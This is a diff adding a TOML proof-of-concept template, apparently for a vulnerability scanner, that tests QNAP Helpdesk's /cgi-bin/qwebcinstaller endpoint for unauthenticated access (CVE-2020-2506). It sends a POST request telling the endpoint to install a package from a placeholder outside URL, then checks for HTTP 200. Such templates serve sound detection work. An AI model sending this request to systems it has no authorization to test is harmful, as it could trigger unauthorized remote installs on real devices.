@@ -1,0 +1,31 @@
+[info]
+author = "ave"
+description = "检测 QNAP Helpdesk /cgi-bin/qwebcinstaller 端点是否存在未授权访问漏洞（CVE-2020-2506），通过发送 POST 请求验证端点是否可被未认证用户访问"
+id = "POC-AVE-2020-0017"
+name = "QNAP Helpdesk 授权机制不正确 PoC"
+severity = "high"
+tags = ["ave-2020-0017"]
+vuln_id = [
+    "CVE-2020-2506",
+    "AVE-2020-0017",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/qwebcinstaller"
+protocol = "http"
+
+[poc.requests.body]
+content = "action=install&pkgurl=http://example.com/test"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
